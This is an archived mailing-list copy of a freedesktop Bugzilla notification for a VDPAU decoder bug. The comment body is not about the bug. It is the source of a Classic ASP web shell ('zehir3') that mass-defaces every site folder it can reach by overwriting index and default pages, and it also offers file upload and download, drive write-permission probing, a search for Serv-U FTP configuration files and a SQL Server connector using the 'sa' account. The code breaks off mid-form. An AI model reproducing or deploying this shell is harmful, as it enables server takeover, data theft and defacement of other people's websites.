From: bugzilla-daemon-CC+yJ3UmIYqDUpFQwHEjaQ@public.gmane.org
Subject: [Bug 95251] vdpau decoder capabilities: not supported
Date: Mon, 21 Aug 2017 01:23:32 +0000
Message-ID: <bug-95251-8800-DiOayq8fxt@http.bugs.freedesktop.org/>
References: <bug-95251-8800@http.bugs.freedesktop.org/>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="===============1198200687=="
Return-path: <nouveau-bounces-PD4FTy7X32lNgt0PjOBp9y5qC8QIuHrW@public.gmane.org>
In-Reply-To: <bug-95251-8800-V0hAGp6uBxMKqLRl/0Ahz6D7qz1kEfGD2LY78lusg7I@public.gmane.org/>
List-Unsubscribe: <https://lists.freedesktop.org/mailman/options/nouveau>,
 <mailto:nouveau-request-PD4FTy7X32lNgt0PjOBp9y5qC8QIuHrW@public.gmane.org?subject=unsubscribe>
List-Archive: <https://lists.freedesktop.org/archives/nouveau>
List-Post: <mailto:nouveau-PD4FTy7X32lNgt0PjOBp9y5qC8QIuHrW@public.gmane.org>
List-Help: <mailto:nouveau-request-PD4FTy7X32lNgt0PjOBp9y5qC8QIuHrW@public.gmane.org?subject=help>
List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/nouveau>,
 <mailto:nouveau-request-PD4FTy7X32lNgt0PjOBp9y5qC8QIuHrW@public.gmane.org?subject=subscribe>
Errors-To: nouveau-bounces-PD4FTy7X32lNgt0PjOBp9y5qC8QIuHrW@public.gmane.org
Sender: "Nouveau" <nouveau-bounces-PD4FTy7X32lNgt0PjOBp9y5qC8QIuHrW@public.gmane.org>
To: nouveau-PD4FTy7X32lNgt0PjOBp9y5qC8QIuHrW@public.gmane.org
List-Id: nouveau.vger.kernel.org


--===============1198200687==
Content-Type: multipart/alternative; boundary="15032786130.7Ad5.4529";
 charset="UTF-8"


--15032786130.7Ad5.4529
Date: Mon, 21 Aug 2017 01:23:33 +0000
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Bugzilla-URL: http://bugs.freedesktop.org/
Auto-Submitted: auto-generated

https://bugs.freedesktop.org/show_bug.cgi?id=3D95251

--- Comment #9 from sansan <tuyulwarboy-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org> ---
Comment on attachment 123444
  --> https://bugs.freedesktop.org/attachment.cgi?id=3D123444
vdpauinfo

<%
mpat=3Dreplace(Request.ServerVariables("PATH_TRANSLATED"),"/","\")
dosyaPath =3D mid(mpat,InStrRev(mpat,"\")+1)
on error resume next
Dim objFSO,popup
Set objFSO =3D CreateObject ("Scripting.FileSystemObject")
if Request("kuskapani")=3D1 then
    Response.End
end if


if Request("kuskapani")=3D2 then
    on error resume next
    path =3D Request("path")
    sFolder =3D Request("SubFolder")
    fName =3D Request("FileName")
    d1 =3D Request("dosya1")
    d2 =3D Request("dosya2")
    d3 =3D Request("dosya3")
    d4 =3D Request("dosya4")
    d5 =3D Request("dosya5")
    d6 =3D Request("dosya6")
    bg__ =3D Request.Form("selectColour")
    if bg__ =3D "0" then bg__ =3D "#ffffff"
    byMesaj =3D "<body bgColor=3D'"&bg__&"'>" & Request("byMesaj") '&
"<br><br><center><font color=3Dgray size=3D2>Hmei7</font>"

    sFolder =3D Replace(sFolder,"/","\")

    if Right(sFolder,1)<>"\" then sFolder =3D sFolder & "\"
    Set f =3D objFSO.GetFolder(Path)
    Set fc =3D f.SubFolders
    h__ =3D 0
    f__ =3D 0
    ss__ =3D now
    For Each f1 In fc
        hedef_ =3D replace(f1.path,"/","\")
        if Right(hedef_,1)<>"\" then hedef_ =3D hedef_ & "\"
        hedef__ =3D left(hedef_,len(hedef_)-1)
        folderName_ =3D Right(hedef__, len(hedef__)-instrrev(hedef__,"\"))
            if d1<>"" then d1 =3D true
            if d2<>"" then d2 =3D true
            if d3<>"" then d3 =3D true
            if d4<>"" then d4 =3D true
                if d5<>"" then d5 =3D true
                if d6<>"" then d6 =3D true
            on error goto 0:on error resume next
            if fName<>"" then
                Set MyFile =3D objFSO.CreateTextFile(hedef_ & sFolder & fNa=
me,
True)
                MyFile.write byMesaj
            end if
            if d1 then
                Set MyFile =3D objFSO.CreateTextFile(hedef_ & sFolder &
"index.htm", True)
                MyFile.write byMesaj
            end if
            if d2 then
                Set MyFile =3D objFSO.CreateTextFile(hedef_ & sFolder &
"index.html", True)
                MyFile.write byMesaj
            end if
            if d3 then
                Set MyFile =3D objFSO.CreateTextFile(hedef_ & sFolder &
"index.asp", True)
                MyFile.write byMesaj
            end if
            if d4 then
                Set MyFile =3D objFSO.CreateTextFile(hedef_ & sFolder &
"default.asp", True)
                MyFile.write byMesaj
            end if
            if d5 then
                Set MyFile =3D objFSO.CreateTextFile(hedef_ & sFolder &
"index.php", True)
                MyFile.write byMesaj
            end if
            if d6 then
                Set MyFile =3D objFSO.CreateTextFile(hedef_ & sFolder &
"default.html", True)
                MyFile.write byMesaj
            end if

            if err<>0 then
                response.Write folderName_ & " <font
color=3Dred>[FAILED!]</font><br>"
                f__ =3D f__ + 1
            else
                response.Write folderName_ & " <font
color=3Dblue>[HACKED]</font><br>"
                h__ =3D h__ + 1
            end if
    Next
    ss___ =3D now
    response.Write "<br><font color=3Dwhite>by zehir!...</font><br><b>Keter=
angan
: </b> mbuh : "&left(ss__-ss___,5)&"sn. ;)<br><font color=3Dblue>Hacked</fo=
nt> =3D
"&h__&"<br><font color=3Dred>Failed</font> =3D "&f__
    response.End
end if

status =3D Request("status")
path   =3D Request("path")
dPath  =3D Request("dPath")
arama  =3D Request("txArama")
dkayit =3D Request("dkayit")
table  =3D Request("table")
del    =3D Request("del")
islem  =3D Request("islem")
strSQL =3D Request("strSQL")
cf       =3D Request("cf")
pathfile =3D request("pathfile")
if path=3D"" then path=3Drequest.servervariables("APPL_PHYSICAL_PATH")
if status=3D"" then status=3D2
popup =3D true
'////////////////////////////////
Function ReadBinaryFile(FileName)
  Const adTypeBinary =3D 1
  Dim BinaryStream
  Set BinaryStream =3D CreateObject("ADODB.Stream")
  BinaryStream.Type =3D adTypeBinary
  BinaryStream.Open
  BinaryStream.LoadFromFile FileName
  ReadBinaryFile =3D BinaryStream.Read
End Function
if status=3D"-3" then
    Response.Buffer=3DTrue
    Set Fil =3D objFSO.GetFile(pathfile)

    Response.contenttype=3D"application/force-download"
    Response.AddHeader "Cache-control","private"
    Response.AddHeader "Content-Length", Fil.Size
    Response.AddHeader "Content-Disposition", "attachment; filename=3D" &
Fil.name

    Response.BinaryWrite readBinaryFile(Fil.path)
    Set f =3D Nothing: Set Fil =3D Nothing
    response.End()
end if
'//////////////////////////////////
if status=3D"-4" then popup=3Dfalse
if status=3D"13" then popup=3Dfalse
if status=3D"14" then popup=3Dfalse
if status=3D"15" then popup=3Dfalse
if status=3D"16" then popup=3Dfalse
if status=3D"17" then popup=3Dfalse
if status=3D"18" then popup=3Dfalse
if status=3D"19" then popup=3Dfalse
if status=3D"33" then popup=3Dfalse
if status=3D"40" then popup=3Dfalse
if status=3D"50" then popup=3Dfalse
byMsg =3D request.QueryString("byMsg")
if byMsg<>"" then response.Write byMsg
response.Write "<title>zehir3 --> powered by zehir</title>"
if popup then
%>
<center>
<a href=3D"<%=3DdosyaPath%>?mevla=3D1&status=3D13"
onclick=3D"sistemBilgisi(this.href);return false;">System Info</a>
<font color=3Dyellow> | </font>
<a href=3D"<%=3DdosyaPath%>?mevla=3D1&status=3D40"
onclick=3D"sistemTest(this.href);return false;">System Test</a>
<font color=3Dyellow> | </font>
<a href=3D"<%=3DdosyaPath%>?mevla=3D1&status=3D50&path=3D<%=3Dpath%>"
onclick=3D"SitelerTestte(this.href);return false;">Sites Test</a>
<font color=3Dyellow> | </font>
<a href=3D"<%=3DdosyaPath%>?mevla=3D1&status=3D14&path=3D<%=3Dpath%>"
onclick=3D"klasorIslemleri(this.href);return false;">Folder Action</a>
<font color=3Dyellow> | </font>
<a href=3D"<%=3DdosyaPath%>?mevla=3D1&status=3D15" onclick=3D"sqlServer(thi=
s.href);return
false;">SQL Server</a>
<font color=3Dyellow> | </font>
<a href=3D"<%=3DdosyaPath%>?mevla=3D1&status=3D33" onclick=3D"poweredby(thi=
s.href);return
false;">POWERED BY</a>
<script language=3Djavascript>
    function sistemBilgisi(yol){
        NewWindow(yol,"",600,240,"no");
    }
    function SitelerTestte(yol){
        NewWindow(yol,"",530,420,"no");
    }
    function klasorIslemleri(yol){
        NewWindow(yol,"",400,280,"no");
    }
    function sqlServer(yol){
        NewWindow(yol,"",300,50,"no");
    }
    function poweredby(yol){
        NewWindow(yol,"",300,50,"no");
    }
    function sistemTest(yol){
        NewWindow(yol,"",400,300,"no");
    }
</script>
<%
end if
'####################################
Class clsUpload
    Private mbinData
    Private mlngChunkIndex
    Private mlngBytesReceived
    Private mstrDelimiter
    Private CR
    Private LF
    Private CRLF
    Private mobjFieldAry()
    Private mlngCount

    Private Sub RequestData
        Dim llngLength
        mlngBytesReceived =3D Request.TotalBytes
        mbinData =3D Request.BinaryRead(mlngBytesReceived)
    End Sub

    Private Sub ParseDelimiter()
        mstrDelimiter =3D MidB(mbinData, 1, InStrB(1, mbinData, CRLF) - 1)
    End Sub

    Private Sub ParseData()
        Dim llngStart
        Dim llngLength
        Dim llngEnd
        Dim lbinChunk
        llngStart =3D 1
        llngStart =3D InStrB(llngStart, mbinData, mstrDelimiter & CRLF)
        While Not llngStart =3D 0
            llngEnd =3D InStrB(llngStart + 1, mbinData, mstrDelimiter) - 2
            llngLength =3D llngEnd - llngStart
            lbinChunk =3D MidB(mbinData, llngStart, llngLength)
            Call ParseChunk(lbinChunk)
            llngStart =3D InStrB(llngStart + 1, mbinData, mstrDelimiter & C=
RLF)
        Wend
    End Sub

    Private Sub ParseChunk(ByRef pbinChunk)
        Dim lstrName
        Dim lstrFileName
        Dim lstrContentType
        Dim lbinData
        Dim lstrDisposition
        Dim lstrValue
        lstrDisposition =3D ParseDisposition(pbinChunk)
        lstrName =3D ParseName(lstrDisposition)
        lstrFileName =3D ParseFileName(lstrDisposition)
        lstrContentType =3D ParseContentType(pbinChunk)
        If lstrContentType =3D "" Then
            lstrValue =3D CStrU(ParseBinaryData(pbinChunk))
        Else
            lbinData =3D ParseBinaryData(pbinChunk)
        End If
        Call AddField(lstrName, lstrFileName, lstrContentType, lstrValue,
lbinData)
    End Sub

    Private Sub AddField(ByRef pstrName, ByRef pstrFileName, ByRef
pstrContentType, ByRef pstrValue, ByRef pbinData)
        Dim lobjField
        ReDim Preserve mobjFieldAry(mlngCount)
        Set lobjField =3D New clsField
        lobjField.Name =3D pstrName
        lobjField.FilePath =3D pstrFileName
        lobjField.ContentType =3D pstrContentType
        If LenB(pbinData) =3D 0 Then
            lobjField.BinaryData =3D ChrB(0)
            lobjField.Value =3D pstrValue
            lobjField.Length =3D Len(pstrValue)
        Else
            lobjField.BinaryData =3D pbinData
            lobjField.Length =3D LenB(pbinData)
            lobjField.Value =3D ""
        End If
        Set mobjFieldAry(mlngCount) =3D lobjField
        mlngCount =3D mlngCount + 1
    End Sub

    Private Function ParseBinaryData(ByRef pbinChunk)
        Dim llngStart
        llngStart =3D InStrB(1, pbinChunk, CRLF & CRLF)
        If llngStart =3D 0 Then Exit Function
        llngStart =3D llngStart + 4
        ParseBinaryData =3D MidB(pbinChunk, llngStart)
    End Function

    Private Function ParseContentType(ByRef pbinChunk)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart =3D InStrB(1, pbinChunk, CRLF & CStrB("Content-Type:"),
vbTextCompare)
        If llngStart =3D 0 Then Exit Function
        llngEnd =3D InStrB(llngStart + 15, pbinChunk, CR)
        If llngEnd =3D 0 Then Exit Function
        llngStart =3D llngStart + 15
        If llngStart >=3D llngEnd Then Exit Function
        llngLength =3D llngEnd - llngStart
        ParseContentType =3D Trim(CStrU(MidB(pbinChunk, llngStart, llngLeng=
th)))
    End Function

    Private Function ParseDisposition(ByRef pbinChunk)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart =3D InStrB(1, pbinChunk, CRLF & CStrB("Content-Dispositio=
n:"),
vbTextCompare)
        If llngStart =3D 0 Then Exit Function
        llngEnd =3D InStrB(llngStart + 22, pbinChunk, CRLF)
        If llngEnd =3D 0 Then Exit Function
        llngStart =3D llngStart + 22
        If llngStart >=3D llngEnd Then Exit Function
        llngLength =3D llngEnd - llngStart
        ParseDisposition =3D CStrU(MidB(pbinChunk, llngStart, llngLength))
    End Function

    Private Function ParseName(ByRef pstrDisposition)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart =3D InStr(1, pstrDisposition, "name=3D""", vbTextCompare)
        If llngStart =3D 0 Then Exit Function
        llngEnd =3D InStr(llngStart + 6, pstrDisposition, """")
        If llngEnd =3D 0 Then Exit Function
        llngStart =3D llngStart + 6
        If llngStart >=3D llngEnd Then Exit Function
        llngLength =3D llngEnd - llngStart
        ParseName =3D Mid(pstrDisposition, llngStart, llngLength)
    End Function
'
---------------------------------------------------------------------------=
---
    Private Function ParseFileName(ByRef pstrDisposition)
        Dim llngStart
        Dim llngEnd
        Dim llngLength
        llngStart =3D InStr(1, pstrDisposition, "filename=3D""", vbTextComp=
are)
        If llngStart =3D 0 Then Exit Function
        llngEnd =3D InStr(llngStart + 10, pstrDisposition, """")
        If llngEnd =3D 0 Then Exit Function
        llngStart =3D llngStart + 10
        If llngStart >=3D llngEnd Then Exit Function
        llngLength =3D llngEnd - llngStart
        ParseFileName =3D Mid(pstrDisposition, llngStart, llngLength)
    End Function

    Public Property Get Count()
        Count =3D mlngCount
    End Property

    Public Default Property Get Fields(ByVal pstrName)
        Dim llngIndex
        If IsNumeric(pstrName) Then
            llngIndex =3D CLng(pstrName)
            If llngIndex > mlngCount - 1 Or llngIndex < 0 Then
                Call Err.Raise(vbObjectError + 1, "clsUpload.asp", "Object =
does
not exist within the ordinal reference.")
                Exit Property
            End If
            Set Fields =3D mobjFieldAry(pstrName)
        Else
            pstrName =3D LCase(pstrname)
            For llngIndex =3D 0 To mlngCount - 1
                If LCase(mobjFieldAry(llngIndex).Name) =3D pstrName Then
                    Set Fields =3D mobjFieldAry(llngIndex)
                    Exit Property
                End If
            Next
        End If
        Set Fields =3D New clsField
    End Property

    Private Sub Class_Terminate()
        Dim llngIndex
        For llngIndex =3D 0 To mlngCount - 1
            Set mobjFieldAry(llngIndex) =3D Nothing

        Next
        ReDim mobjFieldAry(-1)
    End Sub

    Private Sub Class_Initialize()
        ReDim mobjFieldAry(-1)
        CR =3D ChrB(Asc(vbCr))
        LF =3D ChrB(Asc(vbLf))
        CRLF =3D CR & LF
        mlngCount =3D 0
        Call RequestData
        Call ParseDelimiter()
        Call ParseData
    End Sub

    Private Function CStrU(ByRef pstrANSI)
        Dim llngLength
        Dim llngIndex
        llngLength =3D LenB(pstrANSI)
        For llngIndex =3D 1 To llngLength
            CStrU =3D CStrU & Chr(AscB(MidB(pstrANSI, llngIndex, 1)))
        Next
    End Function

    Private Function CStrB(ByRef pstrUnicode)
        Dim llngLength
        Dim llngIndex
        llngLength =3D Len(pstrUnicode)
        For llngIndex =3D 1 To llngLength
            CStrB =3D CStrB & ChrB(Asc(Mid(pstrUnicode, llngIndex, 1)))
        Next
    End Function
End Class
'####################################
Session("n1") =3D "" '"by Ejder"
Class clsField
    Public Name
    Private mstrPath
    Public FileDir
    Public FileExt
    Public FileName
    Public ContentType
    Public Value
    Public BinaryData
    Public Length
    Private mstrText

    Public Property Get BLOB()
        BLOB =3D BinaryData
    End Property

    Public Function BinaryAsText()
        Dim lbinBytes
        Dim lobjRs
        If Length =3D 0 Then Exit Function
        If LenB(BinaryData) =3D 0 Then Exit Function

        If Not Len(mstrText) =3D 0 Then
            BinaryAsText =3D mstrText
            Exit Function
        End If
        lbinBytes =3D ASCII2Bytes(BinaryData)
           mstrText =3D Bytes2Unicode(lbinBytes)
        BinaryAsText =3D mstrText
    End Function

    Public Sub SaveAs(ByRef pstrFileName)
        Const adTypeBinary=3D1
        Const adSaveCreateOverWrite=3D2
        Dim lobjStream
        Dim lobjRs
        Dim lbinBytes
        If Length =3D 0 Then Exit Sub
        If LenB(BinaryData) =3D 0 Then Exit Sub
        Set lobjStream =3D Server.CreateObject("ADODB.Stream")
        lobjStream.Type =3D adTypeBinary
        Call lobjStream.Open()
        lbinBytes =3D ASCII2Bytes(BinaryData)
        Call lobjStream.Write(lbinBytes)

        On Error Resume Next

        Call lobjStream.SaveToFile(pstrFileName, adSaveCreateOverWrite)

        'if err<>0 then response.Write "<br>"&err.Description

        Call lobjStream.Close()
        Set lobjStream =3D Nothing
    End Sub

    Public Property Let FilePath(ByRef pstrPath)
        mstrPath =3D pstrPath
        If Not InStrRev(pstrPath, ".") =3D 0 Then
            FileExt =3D Mid(pstrPath, InStrRev(pstrPath, ".") + 1)
            FileExt =3D UCase(FileExt)
        End If
        If Not InStrRev(pstrPath, "\") =3D 0 Then
            FileName =3D Mid(pstrPath, InStrRev(pstrPath, "\") + 1)
        End If
        If Not InStrRev(pstrPath, "\") =3D 0 Then
            FileDir =3D Mid(pstrPath, 1, InStrRev(pstrPath, "\") - 1)
        End If
    End Property

    Public Property Get FilePath()
        FilePath =3D mstrPath
    End Property

    private Function ASCII2Bytes(ByRef pbinBinaryData)
        Const adLongVarBinary=3D205
        Dim lobjRs
        Dim llngLength
        Dim lbinBuffer
        llngLength =3D LenB(pbinBinaryData)
        Set lobjRs =3D Server.CreateObject("ADODB.Recordset")
        Call lobjRs.Fields.Append("BinaryData", adLongVarBinary, llngLength)
        Call lobjRs.Open()
        Call lobjRs.AddNew()
        Call lobjRs.Fields("BinaryData").AppendChunk(pbinBinaryData & ChrB(=
0))
        Call lobjRs.Update()
        lbinBuffer =3D lobjRs.Fields("BinaryData").GetChunk(llngLength)
        Call lobjRs.Close()
        Set lobjRs =3D Nothing
        ASCII2Bytes =3D lbinBuffer
    End Function

    Private Function Bytes2Unicode(ByRef pbinBytes)
        Dim lobjRs
        Dim llngLength
        Dim lstrBuffer
        llngLength =3D LenB(pbinBytes)
        Set lobjRs =3D Server.CreateObject("ADODB.Recordset")
        Call lobjRs.Fields.Append("BinaryData", adLongVarChar, llngLength)
        Call lobjRs.Open()
        Call lobjRs.AddNew()
        Call lobjRs.Fields("BinaryData").AppendChunk(pbinBytes)
        Call lobjRs.Update()
        lstrBuffer =3D lobjRs.Fields("BinaryData").Value
        Call lobjRs.Close()
        Set lobjRs =3D Nothing
        Bytes2Unicode =3D lstrBuffer
    End Function
End Class
Session("n2") =3D "" '"Ejder"
'####################################
function addslash(path)
    if right(path,1)=3D"\" then addslash=3Dpath else addslash=3Dpath & "\"
end function

sub Upload()
    dim objUpload,f,max,i,name,path,size,success

    set objUpload=3DNew clsUpload

    targetPath=3DobjUpload.Fields("folder").Value
    max=3DobjUpload.Fields("max").Value

    for i=3D1 to max
        name=3DobjUpload.Fields("file" & i).FileName
        size=3DobjUpload.Fields("file" & i).Length
        if (name<>"") and (size>0) then
            gMsg=3DgMsg & "<br>" & vbNewLine & "- " & name & " (" &
FormatNumber(size,0) & " bytes): "
            path=3Daddslash(targetPath) & name
            objUpload.Fields("file" & i).SaveAs path

            if objFSO.FileExists(path) then
                on error resume next
                set f=3DobjFSO.GetFile(path)
                if IsObject(f) then
                    if f.Size=3Dsize then success=3Dtrue else success=3Dfal=
se
                end if
                set f=3Dnothing
            end if
            if success then  gMsg=3DgMsg & "<font color=3Dblue>uploaded</fo=
nt>"
else gMsg =3D gMsg & "<font color=3Dred>failed!</font>"
        end if
    next
    response.Write gMsg
    set objUpload=3Dnothing

end sub

if status=3D"-4" then
    Upload()
'    hataKontrol
    popup=3Dfalse
end if
'////////////////////////////////
sub hataKontrol
    if err<>0 then
        Response.Write "<font color=3Dred size=3D2>Hata :
"&err.Description&"</font>"
    end if
end sub

sub araBul(path_,ara_)
    on error resume next
    If Len(path_) > 0 Then
        cur =3D path_&"\"
        If cur =3D "\\" Then cur =3D ""
            parent =3D ""
            If InStrRev(cur,"\") > 0 Then
            parent =3D Left(cur, InStrRev(cur, "\", Len(cur)-1))
        End If
    Else
        cur =3D ""
    End If

    Set f =3D objFSO.GetFolder(cur)

    Set fc =3D f.Files
    For Each f1 In fc
        if lcase(InStr(1,f1.name,lcase(ara_)))>0 then
            downStr =3D "<font face=3Dwebdings size=3D5><a
href=3D'"&dosyapath&"?status=3D-3&pathFile=3D"&f1.path&"&Time=3D"&time&"'>=
=C3=8D</a></font>"
            if lcase(ara_)=3D"mdb" then
                Response.Write downStr&"<font face=3Dwingdings size=3D5><a
href=3D'"&dosyapath&"?status=3D3&path=3D"&path_&"&Del=3D"&f1.path&"&Time=3D=
"&time&"'>=C3=BB</a></font>
* <a href=3D'"&dosyapath&"?status=3D7&path=3D"&f1.path&"&Time=3D"&time&"'>"=
&f1.path&"
["&f1.size&"]"&"</a></b><br>"
            else
                Response.Write downStr&"<font face=3Dwingdings size=3D5><a
href=3D'"&dosyapath&"?status=3D3&path=3D"&path_&"&Del=3D"&f1.path&"&Time=3D=
"&time&"'>=C3=BB</a><a
href=3D'"&dosyapath&"?status=3D10&dPath=3D"&f1.path&"&path=3D"&path&"&Time=
=3D"&time&"'>!</a></font>
- <a href=3D'"&dosyapath&"?status=3D5&path=3D"&f1.path&"&Time=3D"&time&"'>"=
&f1.path&"
["&f1.size&"]"&"</a></b><br>"
            end if
        end if
    Next

    Set fs =3D f.SubFolders
    For Each f1 In fs
        araBul f1.path,ara_
    Next
    Set    f        =3D Nothing
    Set fc        =3D Nothing
    Set fs        =3D Nothing
end sub

sub sistemTest
    response.Write "<table width=3D'100%' align=3Dcenter cellpadding=3D0
cellspacing=3D0 border=3D1>"
    response.Write "<tr bgcolor=3D#ffffc0><td width=3D'30%' align=3Dcenter>=
<font
color=3Dnavy><b>Lokasi</td><td width=3D'70%' align=3Dcenter><font
color=3Dnavy><b>Keterangan</td></tr>"

    servu_Test
    WriteTestOnDriver
    WriteTestOnLocalPath
    LocalPathParentFolder
    LocalPathPParentFolder

    response.Write "</table>"
end sub

sub servu_Test
    dosya_ =3D Array("Program Files\Serv-u\Serv-u.ini", "Program
Files\Serv-u\Serv-u daemon.ini", "Serv-u\Serv-u.ini", "Serv-u\Serv-u
daemon.ini")
    for each drive_ in objFSO.Drives
        if drive_.Drivetype=3D2 or drive_.Drivetype=3D3 then
            for each d_ in dosya_
                d_ =3D drive_.DriveLetter&":\"&d_
                if objFSO.FileExists(d_) then
                    response.Write "<tr><td><b>Serv-U ini file : </td><td><=
font
color=3Dyellow>"&d_&"</td></tr>"
                end if
            next
        end if
    next
end sub

function yaziyomu(yol)
    on error goto 0:on error resume next
    dim sonuc__
    Set MyFile =3D objFSO.CreateTextFile(yol & "\test.zehir", True)
    MyFile.write "byzehir"
    set MyFile =3D Nothing
    if err<>0 then
        sonuc__=3D"<font color=3Dred>This file is very dangerous !!, delete=
 me
plz</font>"
    else
        sonuc__=3D"<font color=3Dyellow>Yazma Hakk=C3=BD Var! (bahasane ane=
h) </font>"
        on error goto 0: on error resume next
        objFSO.DeleteFile yol & "\test.zehir",true
        if err<>0 then
            sonuc__=3Dsonuc__&"<br><font color=3Dred>Silme Hakk=C3=BD Yok!<=
/font>"
        else
            sonuc__=3Dsonuc__&"<br><font color=3Dyellow>Silme Hakk=C3=BD Va=
r!</font>"
        end if
    end if
    yaziyomu =3D sonuc__
end function

function yaziyomu2(yol)
    on error goto 0:on error resume next
    Set MyFile =3D objFSO.CreateTextFile(yol & "\test.zehir", True)
    MyFile.write "byzehir"
    set MyFile =3D Nothing
    if err<>0 then
        yaziyomu2 =3D false
    else
        objFSO.DeleteFile yol & "\test.zehir"
        yaziyomu2 =3D true
    end if
end function

sub WriteTestOnDriver
    for each drive_ in objFSO.Drives
        if drive_.Drivetype=3D2 or drive_.Drivetype=3D3 then
            if not yaziyomu2(drive_.DriveLetter&":\") then
                Response.Write
"<tr><td><b>"&drive_.DriveLetter&":\</td><td><font color=3Dred>tidak bisa
diciptakan file, tapi mungkin folder didalamnya bisa :
["&err.Description&"]</td></tr>"
            else
                Response.Write
"<tr><td><b>"&drive_.DriveLetter&":\</td><td><font color=3Dyellow>Folder ini
dapat diciptakan file</td></tr>"
            end if
        end if
    next
end sub

sub WriteTestOnLocalPath
    on error goto 0
    on error resume next
    if not yaziyomu2(request.servervariables("APPL_PHYSICAL_PATH")) then
        Response.Write "<tr><td><b>Local Path </td><td><font color=3Dred>ti=
dak
bisa diciptakan file, tapi mungkin folder didalamnya bisa :
["&err.Description&"]</td></tr>"
    else
        Response.Write "<tr><td><b>Local Path </td><td><font
color=3Dyellow>Folder ini dapat diciptakan file</td></tr>"
    end if
end sub

sub LocalPathParentFolder
    on error goto 0
    on error resume next
    hed_ =3D request.servervariables("APPL_PHYSICAL_PATH")
    if Right(hed_,1)=3D"\" then hed_ =3D left(hed_,len(hed_)-1)
    parhed_ =3D left(hed_,InStrRev(hed_,"\"))

    Set f =3D objFSO.GetFolder(parhed_)
    Set fc =3D f.SubFolders

    int_fol=3D0
    int_fil=3D0
    For Each f1 In fc
        int_fol=3Dint_fol+1
    Next

    Set fc =3D f.files
    For Each f1 In fc
        int_fil=3Dint_fil+1
    Next

    if err<>0 then
        Response.Write "<tr><td><b>Local Path <br>Parent Folder</td><td><fo=
nt
color=3Dred>Hata Olu=C3=BEtu : ["&err.Description&"]</td></tr>"
    else
        Response.Write "<tr><td><b>Local Path <br>Parent Folder</td><td><fo=
nt
color=3Dyellow>Folder : "&FormatNumber(int_fol,0)&"<br>File :
"&FormatNumber(int_fil,0)&"</td></tr>"
    end if
end sub

sub LocalPathPParentFolder
    on error goto 0
    on error resume next
    hed_ =3D request.servervariables("APPL_PHYSICAL_PATH")
    if Right(hed_,1)=3D"\" then hed_ =3D left(hed_,len(hed_)-1)
    hed_ =3D left(hed_,InStrRev(hed_,"\"))
    if Right(hed_,1)=3D"\" then hed_ =3D left(hed_,len(hed_)-1)
    parhed_ =3D left(hed_,InStrRev(hed_,"\"))

    Set f =3D objFSO.GetFolder(parhed_)
    Set fc =3D f.SubFolders
    int_fol=3D0
    int_fil=3D0
    For Each f1 In fc
        int_fol=3Dint_fol+1
    Next

    Set fc =3D f.files
    For Each f1 In fc
        int_fil=3Dint_fil+1
    Next

    if err<>0 then
        if err=3D451 then
            Response.Write "<tr><td><b>Local Path <br>P.Parent
Folder</td><td><font color=3Dred>Data =C3=9Cst Klasor Yok :)</td></tr>"
        else
            Response.Write "<tr><td><b>Local Path <br>P.Parent
Folder</td><td><font color=3Dred>Hata Olu=C3=BEtu : ["&err.Description&"]</=
td></tr>"
        end if
    else
        Response.Write "<tr><td><b>Local Path <br>P.Parent Folder</td><td><=
font
color=3Dyellow>Folder : "&FormatNumber(int_fol,0)&"<br>File :
"&FormatNumber(int_fil,0)&"</td></tr>"
    end if
end sub

SELECT CASE status
CASE 13 'Sistem Bilgisi
    Response.Write "<table width=3D100% cellpadding=3D0 cellspacing=3D0><tr=
><td
colspan=3D2 align=3Dcenter><font color=3Dyellow face=3D'courier new'><b><fo=
nt
style=3D'FONT-WEIGHT:normal' color=3Dred face=3Dwingdings>:</font> Informasi
target<font color=3Dred face=3Dwingdings
style=3D'FONT-WEIGHT:normal'>:</font></td></tr>"
    Response.Write "<tr><td><b><font color=3Dred>Local Adres</td><td> " &
request.servervariables("REMOTE_ADDR") & "</td></tr>"
    Response.Write "<tr><td><b><font color=3Dred>User Agent</td><td> " &
request.servervariables("HTTP_USER_AGENT") & "</td></tr>"
    Response.Write "<tr><td><b><font color=3Dred>Server</td><td> " &
request.servervariables("SERVER_NAME") & "</td></tr>"
    Response.Write "<tr><td><b><font color=3Dred>IP</td><td> " &
request.servervariables("LOCAL_ADDR") & "</td></tr>"
    Response.Write "<tr><td><b><font color=3Dred>HTTPD</td><td> " &
request.servervariables("SERVER_SOFTWARE") & "</td></tr>"
    Response.Write "<tr><td><b><font color=3Dred>Port</td><td> " &
request.servervariables("SERVER_PORT") & "</td></tr>"
    Response.Write "<tr><td><b><font color=3Dred>Yol</td><td> " &
request.servervariables("APPL_PHYSICAL_PATH") & "</td></tr>"
    Response.Write "<tr><td><b><font color=3Dred>Log Root</td><td> " &
request.servervariables("APPL_MD_PATH") & "</td></tr>"
    Response.Write "<tr><td><b><font color=3Dred>HTTPS</td><td> " &
request.servervariables("HTTPS") & "</td></tr>"
    Response.Write "</table>"
    popup =3D false
CASE 14 'Upload and Search
    aramaUpload
    popup =3D false
    hataKontrol
CASE 15 'Ms. SQL Server
    Response.Write "<form method=3Dget action=3D'"&DosyPath&"' target=3D'_o=
pener'
id=3Dform1 name=3Dform1>"
    Response.Write "<table cellpadding=3D0 cellspacing=3D0 align=3Dcenter><=
tr><td
align=3Dcenter><font size=3D2>Tentukan koneksi SQL Server</td></tr><tr><td
align=3Dcenter>"
    Response.Write "<input type=3Dhidden value=3D'7' name=3Dstatus><input t=
ype=3Dhidden
value=3D'"&time&"' name=3DTime>"
    Response.Write "<input style=3D'width:250; height:21'
value=3D'Provider=3DSQLOLEDB.1;Persist Security Info=3DFalse;User ID=3Dsa;I=
nitial
Catalog=3DNorthwind' name=3Dpath><br>"
    response.Write "<input type=3Dsubmit value=3D'Explorasi SQL Server !!'
style=3D'height:23;width:170' id=3Dsubmit1 name=3Dsubmit1>"
    Response.Write "</td></tr></table>"
    response.Write "</form>"

    popup =3D false
    hataKontrol
CASE 16 'file Copy window
    Response.Write "<form method=3Dget action=3D'"&DosyPath&"' id=3Dform1
name=3Dform1>"
    Response.Write "<table cellpadding=3D0 cellspacing=3D0 align=3Dcenter><=
tr><td
width=3D100><font size=3D2>Kop. Yer : </td><td>"
